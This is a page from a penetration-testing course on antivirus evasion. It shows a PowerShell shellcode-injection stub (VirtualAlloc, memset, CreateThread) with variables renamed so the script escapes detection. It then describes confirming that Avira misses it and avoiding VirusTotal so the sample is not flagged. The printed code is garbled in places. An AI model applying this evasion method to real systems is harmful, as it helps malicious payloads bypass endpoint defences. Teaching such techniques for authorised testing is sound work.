Penetration Testing with Kali Linux

```
$size = 0x10000;
if ($var1.Length -gt 0x1000) ($size = $var1.Length);
x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i-le $var1.Length-1;$++++) {$var2::memset([IntPtr](x.ToInt32()+$i)),$var1[$i], 1);}
$var2::CreateThread(0,0,$x,0,0,0); (;); // Start-sleep 60 ;
```

Listing 244 - Renaming variables for In-memory Injection

We have updated our script by changing the Win32 hard-coded class name for the Add-Type cmdlet to iWin32. Similarly, we have renamed sc and winFunc to var1 and var2, respectively.
Once we run the PowerShell script as bypass.ps1 and transfer it over the target Windows 11 client, we can run a Quick Scan to verify that our attack vector is undetected. To run the scan, we'll click on the Security option on the left menu, select Virus Scans, and then click on Scan under the Quick Scan option.

> To get sense of the detection rate, we could have uploaded the modified bypass to VirusTotal as well. However, as we learned earlier, this could jeopardize our penetration test as our sample could be analyzed and detected by the more powerful cloud-based machine learning engines.

Once Avira has scanned our script on our Windows 11 machine, it indicates our script is not malicious.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

368